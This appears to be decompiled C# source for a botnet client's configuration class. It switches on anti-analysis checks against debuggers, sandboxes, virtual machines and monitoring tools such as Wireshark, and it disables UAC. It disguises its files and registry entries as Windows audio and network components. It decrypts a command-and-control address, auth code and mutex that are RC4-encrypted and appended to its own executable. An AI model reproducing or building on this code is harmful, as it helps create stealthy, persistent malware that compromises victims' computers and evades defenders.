using System;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace SysDriver;

internal class cConfig
{
	public bool bAntiCain = true;

	public bool bAntiSandboxie = true;

	public bool bAntiDebugger = true;

	public bool bAntiEmulator = true;

	public bool bAntiFilemon = true;

	public bool bAntiNetstat = true;

	public bool bAntiNetworkmon = true;

	public bool bAntiParallelsDesktop = true;

	public bool bAntiProcessmon = true;

	public bool bAntiRegmon = true;

	public bool bAntiTCPView = true;

	public bool bAntiVirtualBox = true;

	public bool bAntiVirtualPC = true;

	public bool bAntiVMWare = true;

	public bool bAntiWireshark = true;

	public bool bDisableUAC = true;

	public string[] sFileName = new string[2] { "audiohd.exe", "WUDHost.exe" };

	public string[] sRegName = new string[2] { "Windows Audio Driver", "Windows-Network Component" };

	public string[] sFilePath = new string[2];

	public string sCServerAddress = string.Empty;

	public string sMutex = string.Empty;

	public string sAuthCode = string.Empty;

	public string sBotVersion = "1.0.5.0";

	public int iConnectionInterval;

	public int iPersistentInterval = 30;

	public string sHWID = string.Empty;

	public string sWinVersion = string.Empty;

	public string sPCName = Environment.MachineName;

	public bool bAdminStatus;

	private string sSplit = "XPADDINGX";

	private string sCryptPW = "N0PE";

	public cConfig()
	{
		loadInfos();
	}

	private void loadInfos()
	{
		string empty = string.Empty;
		StreamReader streamReader = new StreamReader(Process.GetCurrentProcess().MainModule!.FileName!.ToString());
		empty = streamReader.ReadToEnd();
		streamReader.Close();
		try
		{
			empty = empty.Substring(empty.Length - 460, 460).Replace(Convert.ToChar(0), Convert.ToChar(32)).Trim();
			byte[] bData = Convert.FromBase64String(empty);
			cCrypt.RC4(ref bData, sCryptPW);
			string[] array = Encoding.Default.GetString(bData).Split(new string[1] { sSplit }, StringSplitOptions.None);
			sCServerAddress = array[1];
			iConnectionInterval = int.Parse(array[2].Trim());
			sAuthCode = array[3].Trim();
			sMutex = array[4].Trim();
		}
		catch
		{
			Environment.Exit(0);
		}
	}
}
